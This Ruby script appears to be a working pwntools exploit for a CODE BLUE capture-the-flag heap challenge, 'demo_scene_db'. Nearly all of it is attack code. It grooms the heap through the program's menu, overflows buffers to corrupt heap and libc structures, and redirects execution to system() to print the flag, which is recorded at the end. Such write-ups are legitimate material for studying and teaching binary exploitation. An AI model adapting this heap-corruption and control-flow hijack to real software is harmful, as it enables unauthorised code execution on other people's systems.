#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = 'db.tasks.ctf.codeblue.jp', 11451
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'demo_scene_db'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug

def pt; z.recvuntil('> '); end
def create(des, sz, yn, sc)
  @id ||= 0
  pt
  z.puts 1
  z.recvuntil 'use?'
  z.puts sz
  z.puts yn
  z.write des
  z.write sc
  @id += 1
end

def copy(id1, id2)
  pt
  z.puts 5
  z.recvuntil(': ')
  z.puts id1
  z.puts id2
end

def combine(id1, id2, des)
  pt
  z.puts 6
  z.recvuntil(': ')
  z.puts id1
  z.puts id2
  z.write des
end

def edit_desc(idx, desc)
  pt; z.puts 2
  z.puts idx
  z.write desc
end

def edit_scene(idx, desc)
  pt; z.puts 3
  z.puts idx
  z.write desc
end

# leak from malloc error
libc, heap, stack = 0x7f5fd414c000, 0x19d6000, 0x7ffc03475000
libc, heap, stack = 0x7f9449dc8000, 0x1042000, 0x7ffc16575000 if @local
glibc = ELF.new('./libc.so.6')
glibc.address = libc

dl_open = create("\n", 0x1d0-1, 'y', "\n")
id1 = create("meow\n", 1, 'y', "A" * 255)
id2 = create("meow\n", 2, 'y', "B" * 0x1ff)
over1 = create("over1\n", 1, 'n', "\n") 
c129 = create("c129\n", 1, 'n', "c" * 127 + "\x01\x1c"+"\n")
c129_2 = create("c129_2\n", 1, 'n', "C" * 127 + p16(0x3d01) + "\n")
copy(id2, id1)
copy(id1, over1)

combine(over1, c129, "big\n"); big = @id += 1
combine(over1, c129_2, "big2\n"); big2 = @id += 1
f = create("small\n", 2, 'y', "\n")
copy(big, f)
ee = create("CCCCCC\n", 100, 'y', 'A' * (8 + 16 * 255) + 0x3d10.p16 + "\n")
pt;z.puts 3;z.puts ee; z.write('A' * (8 + 16 * 255) + "\x00")
copy(big2, f)

create("OAO\n", 0x2c, 'y', 'A' * (0x2c * 256 - 8) + p64(0x10101)[0, 4])
unsort = glibc.address + 0x3c4b78

create("dummy\n", 12, 'y', "\n")

def extra_edit_scene(idx, target)
  until target.empty?
    if target[-1] == "\x00"
      data = 'A' * (target.size - 1) + "\x00"
      target = target[0..-2]
    else
      data = target.gsub("\x00", 'A') + "\x00"
      target = target[0..-2] until target.empty? || target[-1] == "\x00"
    end
    edit_scene(idx, data)
    # p [all, target.size]
  end
end

add_al_ret = libc + 0x2da69
extra_edit_scene(dl_open, flat(add_al_ret, glibc.symbols.system, "cat flag >&2\x00"))

log.info('ee = ' + ee.to_s)
tar_at = heap + 0x1d000+0x100 * 19+0x2d00+0x100
small300 = libc + 0x3c4e68
target = flat('A' * 24, tar_at + 0xd00, 0).ljust(256 * 0xd, 'A') + flat(0x300, small300, tar_at + 0x10)
log.info('first extra..')
extra_edit_scene(ee, target)

fake = 0x6040c0
create('A' * 16 + p64(fake-0x10)[0, 4], 2, 'y', "\n")

log.info('second extra..')
extra_edit_scene(ee, flat('A' * 16,0x301, fake-0x18, fake-0x10))

create("meow\n", 2, 'y', "\n")

many = create("meow\n", 0x44, 'n', "\n" * 0x43 + "\x02" * 0x80 + (heap+0x10+248).p64[0, 5])
arena = 12
copy(many, 12)
# STDIN.gets
z.puts 7
z.interact

# CBCTF{Actually I don't know about Demo Scene much :(}
